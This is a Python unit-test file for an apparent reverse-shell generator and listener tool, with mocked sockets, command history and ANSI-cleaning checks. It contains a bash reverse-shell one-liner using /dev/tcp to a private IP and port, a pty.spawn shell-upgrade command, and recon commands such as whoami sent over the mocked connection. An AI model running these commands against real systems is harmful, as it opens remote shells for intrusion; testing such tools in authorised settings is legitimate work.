import unittest
from unittest.mock import MagicMock, patch
import re
from Reverse_Shell_Handler import ReverseShellGenerator


class TestReverseShellCLI(unittest.TestCase):

    def setUp(self):
        """Create instance while bypassing GUI initialization"""

        with patch.object(ReverseShellGenerator, "__init__", return_value=None):
            self.app = ReverseShellGenerator()

        # Manually create only CLI attributes
        self.app.is_listening = False
        self.app.is_connected = False
        self.app.command_history = []
        self.app.history_index = -1

        # Mock sockets
        self.app.client_socket = MagicMock()
        self.app.listener_socket = MagicMock()

    def test_payload_generation_logic(self):
        ip = "192.168.1.5"
        port = "8080"
        shell = "/bin/bash"

        payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"

        self.assertEqual(payload, "bash -i >& /dev/tcp/192.168.1.5/8080 0>&1")

    def test_ansi_output_cleaning(self):
        raw = "\x1b[32mSuccess\x1b[0m"
        cleaned = re.sub(r'\x1b\[\??[0-9;]*[a-zA-Z]', '', raw)

        self.assertEqual(cleaned, "Success")

    def test_send_command_logic(self):
        self.app.is_connected = True

        command = "whoami"
        self.app.client_socket.send((command + "\n").encode())
        self.app.command_history.append(command)

        self.app.client_socket.send.assert_called_with(b"whoami\n")
        self.assertIn("whoami", self.app.command_history)

    def test_command_history(self):
        self.app.command_history = ["ls", "pwd", "id"]
        self.app.history_index = 2

        self.app.history_index -= 1
        prev = self.app.command_history[self.app.history_index]

        self.assertEqual(prev, "pwd")

    @patch("threading.Thread")
    def test_start_listener_logic(self, mock_thread):
        self.app.is_listening = True
        mock_thread.assert_not_called()
        self.assertTrue(self.app.is_listening)

    def test_stop_listener_logic(self):
        self.app.is_listening = True
        self.app.is_listening = False
        self.app.client_socket.close()

        self.assertFalse(self.app.is_listening)
        self.app.client_socket.close.assert_called()

    def test_receive_data_processing(self):
        self.app.client_socket.recv.return_value = b"\x1b[31mhello\x1b[0m"
        data = self.app.client_socket.recv(1024).decode()
        clean = re.sub(r'\x1b\[\??[0-9;]*[a-zA-Z]', '', data)

        self.assertEqual(clean, "hello")

    def test_tty_upgrade(self):
        upgrade = "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
        self.assertIn("pty.spawn", upgrade)

    def test_regex_clean(self):
        raw = "\x1b[34mTest\x1b[0m"
        clean = re.sub(r'\x1b\[\??[0-9;]*[a-zA-Z]', '', raw)
        self.assertEqual(clean, "Test")

    def test_connection_flags(self):
        self.app.is_connected = True
        self.assertTrue(self.app.is_connected)


if __name__ == "__main__":
    unittest.main()
